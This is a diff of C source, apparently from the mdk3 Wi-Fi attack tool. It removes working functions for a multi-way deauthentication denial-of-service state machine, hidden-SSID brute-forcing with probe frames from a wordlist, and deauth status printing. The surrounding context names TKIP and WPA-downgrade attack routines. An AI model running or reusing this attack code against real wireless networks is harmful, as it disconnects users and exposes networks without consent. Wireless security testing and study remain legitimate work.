@@ -479,85 +479,6 @@ void mac_bruteforce_sniffer()
 
 }
 
-
-struct pckt amok_machine(char *filename)
-{
-    // FSM for multi-way deauthing
-    static time_t t_prev = 0;
-
-    switch (state) {
-	case 0:
-	    newone:
-
-	    if (wblist) {			//Periodically re-read list every LIST_REREAD_PERIOD sec.
-		if (t_prev == 0) {
-		    printf("Periodically re-reading blacklist/whitelist every %d seconds\n\n", LIST_REREAD_PERIOD);
-		}
-		if (time(NULL) - t_prev >= LIST_REREAD_PERIOD) {
-		    t_prev = time( NULL );
-		    load_whitelist(filename);
-		}
-	    }
-
-	    pkt_amok = get_target_deauth();
-	    if ((pkt_amok[1] & '\x01') && (pkt_amok[1] & '\x02')) {	// WDS packet
-		mac_sa = pkt_amok + 4;
-		mac_ta = pkt_amok + 10;
-		wds = 1;
-	    }
-	    else if (pkt_amok[1] & '\x01') {		// ToDS packet
-		mac_ta = pkt_amok + 4;
-		mac_sa = pkt_amok + 10;
-		wds = 0;
-	    }
-	    else if (pkt_amok[1] & '\x02') {		// FromDS packet
-		mac_sa = pkt_amok + 4;
-		mac_ta = pkt_amok + 10;
-		wds = 0;
-	    }
-	    else if ((!(pkt_amok[1] & '\x01')) && (!(pkt_amok[1] & '\x02'))) {	//AdHoc packet
-		mac_sa = pkt_amok + 10;
-		mac_ta = pkt_amok + 16;
-		wds = 0;
-	    }
-	    else {
-		goto newone;
-	    }
-
-	    if (wblist == 2) {			//Using Blacklist mode - Skip if neither Client nor AP is in list
-		if (!(is_whitelisted(mac_ta)) && !((is_whitelisted(mac_sa))))
-		    goto newone;
-	    }
-            if (wblist == 1) {			//Using Whitelist mode - Skip if Client or AP is in list
-		if (is_whitelisted(mac_ta)) goto newone;
-		if (is_whitelisted(mac_sa)) goto newone;
-	    }
-
-	    state = 1;
-	    return create_deauth_frame(mac_ta, mac_sa, mac_ta, 1);
-	case 1:
-	    state = 2;
-	    if (wds) state = 4;
-	    return create_deauth_frame(mac_ta, mac_sa, mac_ta, 0);
-	case 2:
-	    state = 3;
-	    return create_deauth_frame(mac_sa, mac_ta, mac_ta, 1);
-	case 3:
-	    state = 0;
-	    return create_deauth_frame(mac_sa, mac_ta, mac_ta, 0);
-	case 4:
-	    state = 5;
-	    return create_deauth_frame(mac_sa, mac_ta, mac_sa, 1);
-	case 5:
-	    state = 0;
-	    return create_deauth_frame(mac_sa, mac_ta, mac_sa, 0);
-	}
-
-    // We can never reach this part of code unless somebody messes around with memory
-    // But just to make gcc NOT complain...
-    return create_deauth_frame(mac_sa, mac_ta, mac_sa, 0);
-}
-
 struct pckt false_tkip(unsigned char *target)
 {
     struct pckt michael, src;
@@ -1120,79 +1041,6 @@ struct pckt wpa_downgrade()
 
 }
 
-struct pckt renderman_discovery_tool()
-{  
-//1. mdk3 listens on some interface for beacons with hidden SSID
-//2. it sends PROBE packets with SSIDs from a file back to the AP
-//3. it waits for a response, prints the results
-//4. it stores the APs MAC addr to not probe it a second time (be very nice)
-  
-    int len;
-    unsigned char *zero_ssid = malloc(MAX_PACKET_LENGTH);
-    static struct clist known;
-    static int init_known = 0;
-    static unsigned char *cur_ap = NULL;
-    static int ssid_queue_in_use = 0;
-    char *cur_ssid;
-    
-    memset(zero_ssid, '\x00', MAX_PACKET_LENGTH);
-    if (cur_ap == NULL) {
-	cur_ap = malloc(ETHER_ADDR_LEN);
-	memset(cur_ap, '\x00', ETHER_ADDR_LEN);
-    }
-    
-    if (ssid_queue_in_use) {
-          cur_ssid = read_line_from_file(1); 
-      if (cur_ssid == NULL) {
-	ssid_queue_in_use = 0;
-      } else {
-	return create_probe_frame(cur_ssid, generate_mac(1), pkt_sniff+16);
-      }
-    }
-    
-    while (1) {
-	while (1) {
-	    len = osdep_read_packet(pkt_sniff, MAX_PACKET_LENGTH);
-	    if (len < 40) continue;
-	    if (! memcmp(pkt_sniff, "\x80", 1)) {
-		if ((pkt_sniff[37] == '\x00') || (pkt_sniff[37] == '\x01')) break; // Null or one-byte length SSID => hidden
-		if (! memcmp(pkt_sniff+38, zero_ssid, pkt_sniff[37])) break; // SSID consists only of \x00 => hidden
-	    }
-	    if (! memcmp(pkt_sniff, "\x50", 1)) {
-		if (! memcmp(pkt_sniff+16, cur_ap, ETHER_ADDR_LEN)) {
-		    pkt_sniff[38+pkt_sniff[37]] = '\x00';
-		    printf("%s\n", pkt_sniff+38);
-		    if (! init_known) {
-			init_clist(&known, cur_ap, 0, ETHER_ADDR_LEN);
-			init_known = 1;
-		    } else {
-			add_to_clist(&known, cur_ap, 0, ETHER_ADDR_LEN);
-		    }
-		    memset(cur_ap, '\x00', ETHER_ADDR_LEN);
-		}
-	      
-	    }
-	}
-
-    // Is this AP already known?
-	if (! init_known) break;
-	if (search_data(&known, pkt_sniff+16, ETHER_ADDR_LEN) == NULL) break;
-    }
-    
-    memcpy(cur_ap, pkt_sniff + 16, ETHER_ADDR_LEN);
-    printf("\r%02X:%02X:%02X:%02X:%02X:%02X: ", cur_ap[0], cur_ap[1], cur_ap[2], cur_ap[3], cur_ap[4], cur_ap[5]);
-    
-    if (brute_ssid != NULL) return create_probe_frame(brute_ssid, generate_mac(1), pkt_sniff+16);
-
-    ssid_queue_in_use = 1;
-    cur_ssid = read_line_from_file(1); 
-    if (cur_ssid == NULL) { 
-	printf("Empty SSID file\n");
-	exit(-1);
-    } else {
-	return create_probe_frame(cur_ssid, generate_mac(1), pkt_sniff+16);
-    }
-}
 
 /* Response Checkers */
 
@@ -1208,29 +1056,6 @@ int get_array_index(int array_len, unsigned char *ap)
     }
 
     return -1;
-}
-
-void print_deauth_stats(struct pckt packet)
-{
-// Print some information while in Deauthentication DoS mode
-
-    unsigned char *ap = packet.data+16;
-    unsigned char *fc = packet.data+4;  //For the case AP kicks client
-
-    //For the case client deauthing from AP
-    if (! memcmp(packet.data+4, packet.data+16, ETHER_ADDR_LEN))
-	fc = packet.data + 10;
-
-    printf("\rDisconnecting between: %02X:%02X:%02X:%02X:%02X:%02X", fc[0], fc[1], fc[2], fc[3], fc[4], fc[5]);
-    printf(" and: %02X:%02X:%02X:%02X:%02X:%02X", ap[0], ap[1], ap[2], ap[3], ap[4], ap[5]);
-
-    // Display current channel, if hopper is running
-    if (osdep_get_channel() == 0) {
-	printf("\n");
-    } else {
-	printf(" on channel: %d\n", osdep_get_channel());
-    }
-
 }
 
 void print_wids_stats()
